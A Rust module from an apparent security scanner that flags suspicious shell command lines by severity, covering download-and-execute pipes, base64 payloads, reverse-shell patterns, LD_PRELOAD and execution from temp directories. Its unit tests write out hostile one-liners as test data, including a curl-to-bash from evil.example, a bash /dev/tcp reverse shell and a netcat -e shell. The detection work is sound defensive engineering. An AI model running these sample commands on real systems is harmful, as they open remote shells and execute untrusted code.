//! Heuristics for suspicious command lines, shared by all checks.

use crate::finding::Severity;
use crate::util::fs::in_temp;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hit {
    pub sev: Severity,
    pub what: String,
}

const INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "mksh", "fish", "busybox", "perl", "ruby", "php", "node", "nodejs", "lua", "tclsh"];
const WRAPPERS: &[&str] = &["sudo", "doas", "env", "nohup", "setsid", "exec", "command", "nice", "-"];

/// Split a command into tokens; `|` (pipe) is kept as its own token.
pub fn tokenize(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '|' {
            if !cur.is_empty() {
                out.push(std::mem::take(&mut cur));
            }
            if chars.peek() == Some(&'|') {
                chars.next();
                out.push("||".into());
            } else {
                out.push("|".into());
            }
        } else if c.is_whitespace() || ";&()<>`'\"{}$=".contains(c) {
            if !cur.is_empty() {
                out.push(std::mem::take(&mut cur));
            }
        } else {
            cur.push(c);
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

pub fn base(t: &str) -> &str {
    t.rsplit('/').next().unwrap_or(t)
}

fn is_python(b: &str) -> bool {
    b.strip_prefix("python").is_some_and(|r| r.chars().all(|c| c.is_ascii_digit() || c == '.'))
}

fn is_interp(b: &str) -> bool {
    INTERPRETERS.contains(&b) || is_python(b)
}

/// Scan one command line for suspicious constructs.
pub fn scan(line: &str) -> Vec<Hit> {
    let toks = tokenize(line);
    let mut hits: Vec<Hit> = Vec::new();
    let mut add = |sev: Severity, what: &str| {
        if !hits.iter().any(|h| h.what == what) {
            hits.push(Hit { sev, what: what.to_string() });
        }
    };

    let bases: Vec<&str> = toks.iter().map(|t| base(t)).collect();
    let has = |names: &[&str]| bases.iter().any(|b| names.contains(b));

    // Is anything piped into an interpreter?
    let mut pipe_shell = false;
    for i in 0..toks.len() {
        if toks[i] == "|" {
            let mut j = i + 1;
            while j < toks.len() && (WRAPPERS.contains(&bases[j]) || toks[j].starts_with('-')) {
                j += 1;
            }
            if j < toks.len() && is_interp(bases[j]) {
                pipe_shell = true;
            }
        }
    }

    let download = has(&["curl", "wget", "aria2c", "fetch"]);
    let subst_download = ["$(curl", "$(wget", "`curl", "`wget", "<(curl", "<(wget"].iter().any(|p| line.contains(p));
    if download && (pipe_shell || (subst_download && (bases.iter().any(|b| is_interp(b)) || has(&["eval", "source", "."])))) {
        add(Severity::High, "downloads and executes code (curl/wget into an interpreter)");
    } else if download {
        add(Severity::Med, "network download (curl/wget)");
    }

    if has(&["base64"]) || (has(&["openssl"]) && has(&["base64", "enc"])) {
        if pipe_shell {
            add(Severity::High, "base64-decoded payload piped into an interpreter");
        } else {
            add(Severity::Med, "base64 decoding");
        }
    }

    if line.contains("/dev/tcp/") || line.contains("/dev/udp/") {
        add(Severity::High, "bash /dev/tcp network redirection (reverse shell pattern)");
    }

    if has(&["nc", "ncat", "netcat", "socat"]) {
        let lower = line.to_ascii_lowercase();
        if toks.iter().any(|t| t == "-e" || t == "-c") || lower.contains("exec:") || lower.contains("system:") {
            add(Severity::High, "netcat/socat with command execution (bind/reverse shell)");
        } else {
            add(Severity::Med, "netcat/socat usage");
        }
    }

    for i in 0..toks.len().saturating_sub(1) {
        let b = bases[i];
        let next = toks[i + 1].as_str();
        if (is_python(b) || ["perl", "ruby", "php", "node", "nodejs", "lua"].contains(&b)) && ["-c", "-e", "-E", "-r"].contains(&next) {
            add(Severity::Med, &format!("inline {b} code ({b} {next})"));
        }
        if ["sh", "bash", "zsh", "dash", "ksh"].contains(&b) && ["-c", "-lc", "-ic", "-cl"].contains(&next) {
            add(Severity::Low, &format!("inline shell command ({b} {next})"));
        }
    }

    for t in &toks {
        if in_temp(t) && !["/tmp", "/var/tmp", "/dev/shm"].contains(&t.trim_end_matches('/')) {
            add(Severity::Med, &format!("references temp dir path {t}"));
            break;
        }
    }

    if line.contains("LD_PRELOAD") {
        add(Severity::High, "LD_PRELOAD (library injection)");
    } else if line.contains("LD_LIBRARY_PATH") {
        add(Severity::Med, "LD_LIBRARY_PATH override");
    }
    if has(&["mkfifo"]) {
        add(Severity::Med, "creates a FIFO (often used for shells)");
    }
    if has(&["chattr"]) && toks.iter().any(|t| t.starts_with('+') && t.contains('i')) {
        add(Severity::Med, "makes files immutable (chattr +i)");
    }
    hits
}

/// Well-known hidden dirs where user tools legitimately live.
const COMMON_HIDDEN: &[&str] = &[".local", ".cargo", ".nix-profile", ".bun", ".deno", ".volta", ".nvm", ".pyenv", ".rbenv", ".rustup", ".sdkman", ".dotnet", ".asdf", ".npm-global"];

/// Judge where an executed binary lives.
pub fn exec_location(bin: &str) -> Option<(Severity, String)> {
    let bin = bin.trim_matches(|c| c == '"' || c == '\'');
    if in_temp(bin) {
        return Some((Severity::High, format!("executes from a world-writable temp dir: {bin}")));
    }
    let first_hidden = bin.split('/').find(|c| c.starts_with('.') && *c != "." && *c != "..")?;
    if COMMON_HIDDEN.contains(&first_hidden) {
        Some((Severity::Low, format!("executes from hidden dir {first_hidden} (common for user-installed tools): {bin}")))
    } else {
        Some((Severity::Med, format!("executes from a hidden directory: {bin}")))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn worst(line: &str) -> Option<Severity> {
        scan(line).iter().map(|h| h.sev).max()
    }

    #[test]
    fn tokenizer() {
        assert_eq!(tokenize("curl -s http://x|sh"), vec!["curl", "-s", "http://x", "|", "sh"]);
        assert_eq!(tokenize("a || b"), vec!["a", "||", "b"]);
        assert_eq!(tokenize("X=\"/tmp/a b\""), vec!["X", "/tmp/a", "b"]);
    }

    #[test]
    fn download_pipes() {
        assert_eq!(worst("curl -fsSL https://evil.example/x.sh | bash"), Some(Severity::High));
        assert_eq!(worst("wget -qO- http://x | sudo -E /bin/sh"), Some(Severity::High));
        assert_eq!(worst("bash -c \"$(curl -fsSL http://x)\""), Some(Severity::High));
        assert_eq!(worst("python3 <(curl -s http://x)"), Some(Severity::High));
        assert_eq!(worst("curl -o /var/cache/x http://x"), Some(Severity::Med));
        assert_eq!(worst("curl a || echo failed"), Some(Severity::Med));
    }

    #[test]
    fn other_patterns() {
        assert_eq!(worst("echo aGVsbG8= | base64 -d | sh"), Some(Severity::High));
        assert_eq!(worst("base64 -d blob > out"), Some(Severity::Med));
        assert_eq!(worst("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), Some(Severity::High));
        assert_eq!(worst("nc -e /bin/sh 1.2.3.4 9001"), Some(Severity::High));
        assert_eq!(worst("/usr/bin/nc -z host 80"), Some(Severity::Med));
        assert_eq!(worst("python3 -c 'import pty'"), Some(Severity::Med));
        assert_eq!(worst("/bin/sh -c 'echo hi'"), Some(Severity::Low));
        assert_eq!(worst("export LD_PRELOAD=/usr/lib/libx.so"), Some(Severity::High));
        assert_eq!(worst("/opt/tool --cache=/tmp/xyz"), Some(Severity::Med));
        assert_eq!(worst("cd /tmp"), None);
        assert_eq!(worst("alias ll='ls -la'"), None);
        assert_eq!(worst("/usr/bin/sync"), None);
        assert_eq!(worst("eval \"$(starship init bash)\""), None);
        assert_eq!(worst("source ~/.bash_aliases"), None);
        assert_eq!(worst("encrypt-sync --funcs"), None);
    }

    #[test]
    fn exec_locations() {
        assert_eq!(exec_location("/tmp/.x/run").unwrap().0, Severity::High);
        assert_eq!(exec_location("/dev/shm/a").unwrap().0, Severity::High);
        assert_eq!(exec_location("/home/u/.local/bin/tool").unwrap().0, Severity::Low);
        assert_eq!(exec_location("%h/.config/.hid/run").unwrap().0, Severity::Med);
        assert!(exec_location("/usr/bin/foo").is_none());
        assert!(exec_location("../bin/x").is_none());
    }
}
